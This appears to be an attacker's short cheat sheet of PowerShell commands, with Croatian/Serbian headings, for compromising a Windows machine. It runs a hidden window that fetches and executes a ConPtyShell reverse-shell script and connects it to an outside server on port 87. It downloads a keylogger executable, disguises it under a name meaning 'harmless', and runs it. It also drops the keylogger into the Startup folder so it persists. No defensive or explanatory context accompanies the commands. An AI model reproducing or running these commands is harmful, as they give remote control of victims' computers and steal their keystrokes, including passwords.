--- POVEZIVANJE ---

powershell -WindowStyle Hidden -Command "IEX (IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell (Resolve-DnsName jangosserver.eu).IPAddress 87"

--- SKIDANJE I POKRETANJE KEYLOGGERA ---

Invoke-WebRequest -Uri "https://github.com/Jango47/reverseShell/releases/download/keylogger/keylogger.exe" -OutFile "$env:LOCALAPPDATA\bezopasno.exe"
& "$env:LOCALAPPDATA\bezopasno.exe"

--- SKIDANJE I POKRETANJE KEYLOGGERA NA STARTUPU (MORA BITI ADMIN) ---

Invoke-WebRequest -Uri "https://github.com/Jango47/reverseShell/releases/download/keylogger/keylogger.exe" -OutFile "$env:LOCALAPPDATA\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bezopasno.exe"
& "$env:LOCALAPPDATA\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bezopasno.exe"
